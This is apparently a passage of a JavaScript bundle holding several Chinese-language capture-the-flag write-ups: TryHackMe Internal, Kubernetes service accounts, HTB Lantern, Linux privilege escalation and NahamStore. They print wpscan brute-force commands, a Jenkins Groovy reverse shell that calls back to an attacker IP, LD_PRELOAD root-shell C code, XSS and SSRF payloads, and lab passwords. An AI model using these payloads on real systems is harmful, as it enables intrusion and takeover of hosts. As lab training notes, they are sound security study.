- **避免使用 eval 和 exec**：避免使用 and 函数，因为它们可以执行任意代码并带来重大安全风险。\`eval()\`\`exec()\`
- **输入验证和输出编码**：实施严格的输入验证，以确保只接受预期的数据。应用输出编码技术在序列化之前清理数据。
- **安全编码做法**：遵循安全标准和准则建议的安全编码做法。采用最低特权、深度防御和故障安全默认值等原则。
- **遵守准则**：已建立特定于编程语言或框架的安全编码准则。
## 总结

`,en=`---
title: THM-internal
tags:
  - 靶场
  - THM
description:
---
> 一句话总结：由wordpress到用户信息泄露获取所有权限

## 靶场概述

难度： hard
描述：渗透测试挑战
您被分配到一个客户，该客户希望在三周内将环境发布到生产环境中进行渗透测试。

**工作范围**

客户要求工程师对提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最低信息，希望从恶意行为者的眼睛进行参与（黑盒渗透测试）。客户要求您获取两个标记（未提供位置）作为漏洞利用的证据：

此外，客户还提供了以下范围限额：

- 确保修改 hosts 文件以反映 internal.thm
- 此项目允许使用任何工具或技术
- 找到并记录发现的所有漏洞
- 将发现的标记提交到仪表板
- 只有分配给计算机的 IP 地址在范围内


我鼓励您将此挑战视为实际的渗透测试。考虑编写一份报告，包括执行摘要、漏洞和漏洞利用评估以及补救建议，因为这将使您为 eLearnsecurity eCPPT 或在该领域担任渗透测试员的职业做好准备。

接受项目后，您将获得客户评估环境。保护 User 和 Root 标记，并将其作为漏洞利用证明提交到控制面板。

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.244.196 |
| OS  | kali        | Linux         |

---
## 信息搜集

端口扫描
\`\`\`
┌──(leo㉿HACK)-[~/SecLab/internal]
└─$ rustscan -a 10.10.244.196
Open 10.10.244.196:22
Open 10.10.244.196:80

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
\`\`\`

路径探测

\`\`\`
feroxbuster -u http://10.10.244.196/
 http://10.10.244.196/phpmyadmin
 http://10.10.244.196/wordpress/wp-admin/
\`\`\`
## 攻击向量
以80端口未入口点
	有两个cms 以wordpress未入口进行扫描
wpsan扫描
**(1) 基础扫描**
\`wpscan --url https://example.com\`
**（2）枚举用户和插件**

\`wpscan --url https://example.com --enumerate u,p\`

**（3）使用代理进行扫描**

\`wpscan --url https://example.com --proxy http://127.0.0.1:8080\`

**（4）暴力破解管理员账户**

\`wpscan --url https://example.com --passwords passwords.txt --usernames admin --password-attack wp-login\`

**（5）保存扫描结果为 JSON 文件**

\`wpscan --url https://example.com --output results.json --format json\`


\`\`\`
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection
\`\`\`


尝试密码爆破

\`\`\`
wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt
\`\`\`

![](../assets/img/Pasted%20image%2020241123183241.png)

## 漏洞利用

如果能修改php文件可以替换后进行反弹shell

![](../assets/img/Pasted%20image%2020241123183430.png)
![](../assets/img/Pasted%20image%2020241123183609.png)

WordPress站点的大多数主题位于 /wp-content/ 目录下，主题相关内容则位于 /wp-content/themes/ 目录下；根据我们之前所修改文件对应的主题名称，可知404.php文件位置为：/wp-content/themes/twentyseventeen/404.php 。（由之前的WPScan扫描结果也可知过时的主题相关页面url）

\`\`\`
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
\`\`\`

![](../assets/img/Pasted%20image%2020241123184239.png)

升级为tty
\`\`\`
$ python3 -c "import pty;pty.spawn('bash');
\`\`\`

我们继续使用刚才的初始shell界面进行探索，尝试进一步列举文件和目录信息，最终在/opt目录下发现了一个文件wp-save.txt--内容包含了用户名aubreanna及其登录凭据。

![](../assets/img/Pasted%20image%2020241123184539.png)

## 提权
![](../assets/img/Pasted%20image%2020241123184713.png)
由于目标机器的端口\`8080\`只能通过目标机的本地进行访问，所以我们需要设置SSH本地端口转发，从而将目标机器\`8080\`端口上的流量重定向到我们本地攻击机上的地址和端口\`localhost:4567\`

\`\`\`
ssh -f -N -L 4567:172.17.0.2:8080 aubreanna@internal.thm
#根据前述结果，登录密码为：bubb13guM!@#123
#ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC
#参数说明
#-C：压缩数据
#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。
#-N ：不执行脚本或命令，通常与-f连用。
#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。
#-L : 本地隧道，本地端口:目标IP:目标端口
#-D : 动态端口转发
#-R : 远程隧道
#-T ：不分配 TTY 只做代理用
#-q ：安静模式，不输出 错误/警告 信息
\`\`\`

![](../assets/img/Pasted%20image%2020241123185302.png)

![](../assets/img/Pasted%20image%2020241123185213.png)

我们接下来对该jenkins后台登录页面进行暴力破解，在此我们使用hydra工具，我们还需要获取关于登录框的请求表单数据来为hydra相关命令构造参数。


![](../assets/img/Pasted%20image%2020241123185425.png)
通过暴力破解获取到登录密码后，我们可以登录到jenkins后台，然后利用后台中的脚本控制面板写入[反向shell脚本](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)内容，完成脚本内容写入后--我们就可以尝试执行相关的反向shell脚本（注意先在攻击机上设置一个Netcat监听器），即可获得一个shell界面--身份为jenkins。
![](../assets/img/Pasted%20image%2020241123190238.png)
\`\`\`
String host="10.17.5.121";
int port=4445;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
\`\`\`

![](../assets/img/Pasted%20image%2020241123190554.png)
使用ssh访问root用户并检索root.txt文件内容。

![](../assets/img/Pasted%20image%2020241123190825.png)
## 知识点回顾
## 总结

`,tn=`---
title: 集群级别的最佳 Kubernetes 安全实践。
tags:
  - 靶场
description:
---
> 

## 靶场概述

难度： hard
描述：集群级别的最佳 Kubernetes 安全实践。
这个房间适合所有有抱负的 DevSecOps 工程师和花时间学习该工具基础知识的 Kubernetes 爱好者。它适用于了解该工具、其工作原理以及构建安全 Kubernetes 集群时要采取的初始步骤的人。但现在怎么办？您已经构建了一个安全的集群，但如何确保其安全？随着 Kubernetes 被用作编排容器化应用程序的平台，必须在不同的层上考虑许多不同的安全因素。对于那些希望登上 DevSecOps Express 的人来说，甚至对于那些已经登上的人来说，这可能会让人不知所措。因此，这个房间旨在收集一些关键的最佳 Kubernetes 安全实践，以使您的旅程更加顺畅。全体上车！

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息 |
| --- | ----------- | ------ |
| IP  | 10.17.5.121 |        |
| OS  | kali        |        |

---
## 基础知识

Kubernetes 中最重要的安全实践之一是高效、安全地实施访问控制。服务账户是 Access Control 难题的一部分，您需要完成它才能了解如何实现。服务帐户在 [Kubernetes 简介房间](https://tryhackme.com/r/room/introtok8s)中简要介绍了，但现在是时候更深入地了解它们是什么以及它们在 Kubernetes 中的使用方式了。“服务帐户”是如果您使用其他云技术时可能熟悉的通用术语。在这个任务中，我们将在 Kubernetes 的上下文中定义一个 Service 帐户，一个 **ServiceAccount** 对象。

服务帐户可以被视为数字身份或非人类帐户。在 Kubernetes 中，此身份在安全上下文中用于将身份与特定进程相关联。换句话说，集群内部和外部的 Kubernetes 系统组件、应用程序 Pod 或其他实体都可以使用 ServiceAccount 凭证来标识此 ServiceAccount。从安全角度来看，这意味着可以进行 API 身份验证，或者如前所述，可以使用这些 ServiceAccount 实现身份 / 访问控制。

ServiceAccounts 与用户 


这里是一个很好的观点，可以强调 ServiceAccount 的 “非人类账户” 方面，并消除关于人类用户被身份验证 / 授权进入集群的任何混淆。以下是有关 ServiceAccounts 和 Users 的一些信息。

| **服务账户**            | **用户**                      |
| ------------------- | --------------------------- |
| 由 K8s 管理            | 在 K8s 之外管理                  |
| 由 API 创建            | 没有 “User” Kubernetes Object |
| 具有存储为 Secrets 的关联凭证 | 无法通过 API 创建                 |

从本质上讲，用户访问通常使用某种帐户管理解决方案来处理。Kubernetes 确实有一个内置的，但它通常与另一个用户管理系统（如 LDAP 或 AD）集成。对集群及其资源的非人工访问使用 Kubernetes ServiceAccounts 处理。

![User and ServiceAccount](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1715701923679)  

ServiceAccounts 具有以下属性：

**轻量级：**Kubernetes ServiceAccounts 允许您创建与 Kubernetes 集群中的特定任务/进程关联的账户。这省去了使用用户账户运行流程带来的许多麻烦（使用与用户账户创建中涉及的数据库相关的特殊系统和业务逻辑），并且更容易根据最小权限原则定义更精细的、特定于任务的权限。

**命名空间：**在 Kubernetes 中，ServiceAccounts 是一个命名空间资源，这意味着 ServiceAccount 名称只需要在它们关联的命名空间中是唯一的。每个命名空间在创建时都会获得一个与之关联的默认 ServiceAccount，该名称恰如其分地命名为 “default”。假设您没有在 pod/deployment 定义中手动定义 ServiceAccount。在这种情况下，这个 “默认” ServiceAccount（在创建 Pod 的命名空间中）将被分配给它，并且 ServiceAccounts 凭证（令牌）将作为 secret 挂载到它上面。请注意，默认情况下，“默认”ServiceAccount 的权限很少，因此如果任务需要更多权限，则需要创建一个 ServiceAccount。

**便携式：**由于 ServiceAccount 是轻量级的，并且只需要在命名空间级别是唯一的，因此它们可以捆绑在一起以供其他命名空间或项目使用，从而使其具有可移植性。

这些属性适用于多种用例。作为 DevSecOps 工程师，在处理这些问题时，您的 ServiceAccount 意识应该令人耳目一新。以下是一些示例：

- 在 Pod 中运行的任务/进程需要与 API 通信以检索机密或敏感信息。此处可以使用 ServiceAccount 来授予对此密钥的只读访问权限。  
      
    
- 您在 “example-namespace” 中运行了一个 Pod。其过程包括确保所有 Pod 都在 “other-namespace” 中运行。这里可以使用 ServiceAccount，并结合 RBAC（稍后会详细介绍），以确保此 Pod 有足够的权限在 “other-namespace” 中列出 Pod。  
      
    
- ServiceAccounts 可用于对外部服务进行身份验证。例如，假设您有一个 CI/CD 管道，并且此管道中的某个阶段涉及对 Kubernetes 集群的身份验证。

**ServiceAccounts 的创建和配置**

使用 kubectl 定义 ServiceAccounts 非常容易。您可以使用以下命令在集群上创建 ServiceAccount。  
**注意：**serviceaccount 可以缩写为 sa

kubectl 创建服务帐户

\`\`\`shell-session
thm@k8s:~$ kubectl create serviceaccount example-name --namespace example-namespace
\`\`\`

如果您希望此 ServiceAccount 与特定 Pod 相关联，则可以在 pod/部署配置 YAML 中定义，如下所示：

\`\`\`bash
apiVersion: v1
kind: Pod
metadata:
  name: example-pod
  Namespace: example-namespace
spec:
  serviceAccountName: example-sa
  containers:
  - name: example-container
    image: nginx:latest
    ports:
    - containerPort: 80
\`\`\`


## 信息搜集



## 攻击向量



## 漏洞利用


## 提权


## 知识点回顾
## 总结

`,sn=`---
title: lantern
tags:
  - 靶场
  - HTB
description:
---
## 题目描述

> 难度：难
> 描述：
> 前置条件：


https://racc0x.github.io/posts/lantern/#box-info
---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息      |
| --- | ----------- | ----------- |
| IP  | 10.17.5.121 | 10.10.11.29 |
| OS  | kali        | Linux       |

## 信息搜集

### 端口扫描

\`\`\`
[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.29:22
Open 10.10.11.29:80
Open 10.10.11.29:3000
[~] Starting Script(s)
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 01:06 CST
Initiating Ping Scan at 01:06
Scanning 10.10.11.29 [2 ports]
Completed Ping Scan at 01:06, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:06
Completed Parallel DNS resolution of 1 host. at 01:06, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:06
Scanning lantern.htb (10.10.11.29) [3 ports]
Discovered open port 80/tcp on 10.10.11.29
Discovered open port 22/tcp on 10.10.11.29
Discovered open port 3000/tcp on 10.10.11.29
Completed Connect Scan at 01:06, 0.24s elapsed (3 total ports)
Nmap scan report for lantern.htb (10.10.11.29)
Host is up, received syn-ack (0.24s latency).
Scanned at 2024-11-18 01:06:52 CST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
\`\`\`

### 路径枚举


## 特殊点
文件上传？
![](../assets/img/Pasted%20image%2020241118012812.png)


![](../assets/img/Pasted%20image%2020241118013600.png)

![](../assets/img/Pasted%20image%2020241118014020.png)
Skipper Proxy 是一种开源 HTTP 代理，旨在管理和路由 Web 流量。

SSRF
![](../assets/img/Pasted%20image%2020241118014419.png)

![](../assets/img/Pasted%20image%2020241118014522.png)
![](../assets/img/Pasted%20image%2020241118015508.png)


获取密码没看懂, 先看别人wp获取

\`\`\`
使用凭证登录 lantern.htb：3000   admin:AJbFA_Q@925p9ap#22
\`\`\`

## 漏洞发现

![](../assets/img/Pasted%20image%2020241118020110.png)
![](../assets/img/Pasted%20image%2020241118020300.png)

本地文件读取

![](../assets/img/Pasted%20image%2020241118020721.png)

![](../assets/img/Pasted%20image%2020241118020817.png)

获取到用户
\`\`\`
tomas:x:1000:1000:tomas:/home/tomas:/bin/bash
\`\`\`
## 漏洞利用

## webshell

## usershell

## rootshell


## 知识点回顾
## 总结

`,on=`---
title: Linux 权限提升
tags:
  - 靶场
  - THM
description:
---
https://www.cnblogs.com/Hekeats-L/p/16867299.html

## 题目描述

> 难度：
> 描述：
> 前置条件：

---
> 权限提升是一个旅程。没有灵丹妙药，很大程度上取决于目标系统的具体配置。内核版本、安装的应用程序、支持的编程语言、其他用户的密码是影响您通往 root shell 之路的几个关键因素。  
  
此房间旨在涵盖主要的权限提升向量，并让您更好地了解该过程。无论您是参加 CTF、参加认证考试还是担任渗透测试人员，这项新技能都将成为您武器库的重要组成部分。

# “权限提升”是什么意思？

从本质上讲，权限提升通常涉及从较低权限的帐户转到较高权限的帐户。从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置疏忽，以未经授权访问通常限制用户访问的资源。  
  

为什么它很重要？

在执行实际渗透测试时，很少能够获得提供直接管理访问权限的立足点 （初始访问权限）。权限提升至关重要，因为它允许您获得系统管理员级别的访问权限，从而允许您执行以下操作：

- 重置密码  
    
- 绕过访问控制以破坏受保护的数据
- 编辑软件配置
- 启用持久性
- 更改现有（或新）用户的权限

枚举是访问任何系统后必须采取的第一步。您可能通过利用导致 root 级访问的关键漏洞访问了系统，或者只是找到了一种使用低权限帐户发送命令的方法。与 CTF 计算机不同，渗透测试活动不会在您获得特定系统或用户权限级别的访问权限后结束。正如您将看到的，枚举在妥协后阶段与以前一样重要。

\`\`\`
hostname
\`\`\`

该 命令将返回目标计算机的主机名。尽管此值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在公司网络中的角色的信息（例如，SQL-PROD-01 用于生产 SQL Server）。

\`uname -a\`
将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限提升的潜在内核漏洞时非常有用。

\`cat /etc/os-release\`
\`/proc/version\`
proc 文件系统 （procfs） 提供有关目标系统进程的信息。您会在许多不同的 Linux 版本上找到 proc，使其成为您武器库中必不可少的工具。

查看 可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 GCC）。

\`/etc/issue\`
还可以通过查看文件来识别系统 。此文件通常包含有关操作系统的一些信息，但可以很容易地进行自定义或更改。在主题上，可以自定义或更改任何包含系统信息的文件。为了更清楚地了解该系统，查看所有这些总是好的
\`ps\`
命令 是查看 Linux 系统上正在运行的进程的有效方法。 在终端上键入将显示当前 壳

（Process Status） 的输出将显示以下内容;\`ps\`

- PID：进程 ID（对进程唯一）
- TTY：用户使用的终端类型
- 时间：进程使用的 CPU 时间量（这不是此进程的运行时间）
- CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）

“ps” 命令提供了一些有用的选项。

- \`ps -A\`：查看所有正在运行的进程
- \`ps axjf\`：查看进程树（请参阅下面的树形成，直到运行）\`ps axjf\`

- \`ps aux\`：该选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未附加到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。\`aux\`

\`env\`
PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升

\`sudo -l\`

目标系统可以配置为允许用户使用 root 权限运行某些（或全部）命令。该 命令可用于列出您的用户可以使用 运行的所有命令。

\`ifconfig\`
\`history\`
\`netstat\`
- \`netstat -a\`：显示 所有侦听端口和已建立的连接。
- \`netstat -at\`或者也可以用来列出 TCP 或 UDP 协议 分别。\`netstat -au\`
- \`netstat -l\`：列表 端口处于 “侦听” 模式。这些端口已打开并准备好 接受传入连接。这可以与 “t” 选项一起使用 仅列出正在使用 TCP 协议侦听的端口（如下）

### find 命令

在目标系统中搜索重要信息，以及 潜在的权限提升向量可能是有益的。内置的 “find” 命令很有用，值得保存在您的武器库中。

以下是 “find” 命令的一些有用示例。

**查找文件：**

- \`find . -name flag1.txt\`：flag1.txt在 当前目录
- \`find /home -name flag1.txt\`：flag1.txt在 /home 目录
- \`find / -type d -name config\`：在 “/” 下找到名为 config 的目录
- \`find / -type f -perm 0777\`：查找具有 777 权限的文件 （所有用户都可以读取、可写和执行文件）
- \`find / -perm a=x\`：查找可执行文件
- \`find /home -user frank\`：在 “/home”
- \`find / -mtime 10\`：查找最近 10 个中修改的文件 日
- \`find / -atime 10\`：查找最近 10 个中访问的文件 日
- \`find / -cmin -60\`：查找过去一小时内更改的文件 （60 分钟）
- \`find / -amin -60\`：查找过去一小时内的文件访问 （60 分钟）
- \`find / -size 50M\`：查找大小为 50 MB 的文件

此命令还可以与 （+） 和 （-） 符号一起使用，以指定 大于或小于给定大小的文件。


## 自动枚举

有几种工具可以帮助您在枚举过程中节省时间 过程。这些工具仅用于节省时间，因为它们知道 可能会错过一些权限提升向量。以下是 流行的 Linux 枚举工具及其各自 Github 的链接 存储 库。

目标系统的环境将影响您将要创建的工具 能够使用。例如，您将无法运行工具 如果目标系统上未安装 Python 编写。这 这就是为什么最好熟悉一些而不是 拥有单一的必备工具。

- **林豌豆**： [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum：**[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES （Linux Exploit Suggester）：**[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux 智能枚举：**[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker：** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


  
理想情况下，权限提升会导致 root 权限。这可以 有时只需利用现有漏洞即可实现， 或者在某些情况下，通过访问另一个具有更多 权限、信息或访问权限。

  

除非单个 漏洞会导致 root shell，即权限提升过程 将依赖于错误的配置和松散的权限。

  

Linux 系统上的内核管理组件之间的通信，例如 系统和应用程序上的内存。这个关键功能 要求内核具有特定权限;因此，成功的 利用漏洞可能会导致 root 权限。

  

内核漏洞 方法很简单;

1. 确定 内核版本
2. 搜索和查找 目标系统内核版本的漏洞利用代码
3. 运行漏洞利用

虽然看起来 很简单，请记住，失败的内核漏洞利用可能会导致 系统崩溃。确保此潜在结果是可以接受的 在尝试 内核漏洞。

  

**研究来源：**  

1. 根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。
2. [https://www.cvedetails.com/](https://www.cvedetails.com/) 等来源也很有用。
3. 另一种选择是使用 LES （Linux Exploit Suggester） 之类的脚本，但请记住，这些工具可能会产生误报（报告不影响目标系统的内核漏洞）或漏报（尽管内核易受攻击，但不报告任何内核漏洞）。

**提示/注释：**

1. 在 Google、Exploit-db 或 searchsploit 上搜索漏洞时，内核版本过于具体
2. 在启动漏洞利用代码之前，请确保您了解它的工作原理。一些漏洞利用代码可以在操作系统上进行更改，使它们在进一步使用时不安全，或者对系统进行不可逆的更改，从而在以后产生问题。当然，在实验室或 CTF 环境中，这些可能不是很大的问题，但在真正的渗透测试参与中，这些绝对是禁忌。
3. 某些漏洞利用程序在运行后可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。
4. 您可以使用 Python 模块将漏洞利用代码从您的计算机传输到目标系统。\`SimpleHTTPServer\`\`wget\`

## sudo

默认情况下，sudo 命令允许您使用 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一些权限灵活性。例如，初级 SOC 分析师可能需要定期使用 Nmap，但无法获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行 Nmap，同时在系统的其余部分保持其常规权限级别。

任何用户都可以使用该命令检查其与 root 权限相关的当前情况。\`sudo -l\`

[https://gtfobins.github.io/](https://gtfobins.github.io/) 是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。
**利用应用程序功能**  

在此上下文中，某些应用程序不会有已知的漏洞利用。您可能会看到这样的应用程序是 Apache2 服务器。

在这种情况下，我们可以使用 “hack” 来利用应用程序的功能来泄露信息。正如你在下面看到的，Apache2 有一个支持加载备用配置文件的选项（ ： 指定一个备用的 ServerConfigFile）。\`-f\`

使用此选项加载文件将导致包含文件第一行的错误消息。\`/etc/shadow\`\`/etc/shadow\`

**杆LD_PRELOAD**

在某些系统上，您可能会看到 LD_PRELOAD environment （环境） 选项。
D_PRELOAD 是一个允许任何程序使用共享库的函数。这[篇博文](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)将让您了解 LD_PRELOAD 的功能。如果启用了 “env_keep” 选项，我们可以生成一个共享库，该库将在程序运行之前加载和执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD选项将被忽略。  

此权限提升向量的步骤可以总结如下;

1. 检查LD_PRELOAD（使用 env_keep 选项）
2. 编写编译为共享对象（.so 扩展名）文件的简单 C 代码
3. 使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序

C 代码将简单地生成一个根 shell，并且可以按如下方式编写;

\`\`\`
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
\`\`\`

我们可以将此代码保存为 shell.c，并使用以下参数使用 gcc 将其编译成共享对象文件;

\`\`\`
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
\`\`\`

现在，我们可以在启动用户可以使用 sudo 运行的任何程序时使用此共享对象文件。在我们的例子中，可以使用 Apache2、find 或几乎所有我们可以使用 sudo 运行的程序。

我们需要通过指定 LD_PRELOAD 选项来运行程序，如下所示;
\`\`\`
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
\`\`\`
这将导致生成具有 root 权限的 shell。
## 知识点回顾
## 总结


`,an=`---
title: nahamstore
tags:
  - 靶场
  - THM
description: 在这个房间里，您将学习漏洞赏金狩猎和 Web 应用程序黑客的基础知识
---
## 题目描述

> 难度：中
> 描述：在这个房间里，您将学习漏洞赏金狩猎和 Web 应用程序黑客的基础知识
> 前置条件：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.100.228 |
| OS  | kali        | linux         |
NahamStore 的创建是为了测试您通过 [NahamSec 的](https://twitter.com/nahamsec)“漏洞赏金狩猎和 Web 应用程序黑客简介”[Udemy 课程](http://bugbounty.nahamsec.training/)所学到的知识。 部署机器，获得 IP 地址后，请继续下一步！  

由 [@NahamSec](https://twitter.com/NahamSec) 创建的 Udemy 课程 | 由 [@adamtlangley](https://twitter.com/adamtlangley) 创建的实验室
## 信息搜集

### 端口扫描

子域枚举

\`\`\`
ffuf -u http://nahamstore.thm -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -H "Host: FUZZ.nahamstore.thm" -fw 125

shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 732ms]
www                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 311ms]
marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 353ms]
stock                   [Status: 200, Size: 67, Words: 1, Lines: 1, Duration: 415ms]
WWW                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 413ms]

\`\`\`

---
截至目前我发现了三个在线站点

http://nahamstore.thm/
http://marketing.nahamstore.thm/
http://stock.nahamstore.thm/



### 路径枚举


## 漏洞发现


### XSS

\`\`\`
http://marketing.nahamstore.thm/?error=<script>alert(1)<\/script>
\`\`\`


\`\`\`
http://nahamstore.thm/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
\`\`\`

\`\`\`
http://nahamstore.thm/search?q=%27%2Balert(1)%2B%27
\`\`\`
### SQL注入

\`\`\`
http://nahamstore.thm/product?id=2
\`\`\`

![](../assets/img/Pasted%20image%2020241116225922.png)
### SSRF

\`\`\`
POST /stockcheck HTTP/1.1

Host: nahamstore.thm

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 69

Origin: http://nahamstore.thm

Connection: keep-alive

Referer: http://nahamstore.thm/product?id=2

Cookie: session=023eb953d53167fef31a620a71d256d9; token=7708256ecdefdd7e793acf8e488e9be9

Priority: u=0



product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm#
\`\`\`

![](../assets/img/Pasted%20image%2020241117002121.png)

### XXE
![](../assets/img/Pasted%20image%2020241117003240.png)


### RCE2

![](../assets/img/Pasted%20image%2020241117005007.png)
## 漏洞利用

## webshell

## usershell

## rootshell


## 知识点回顾

1. 子域枚举
2. 目录枚举
3. 内容发现
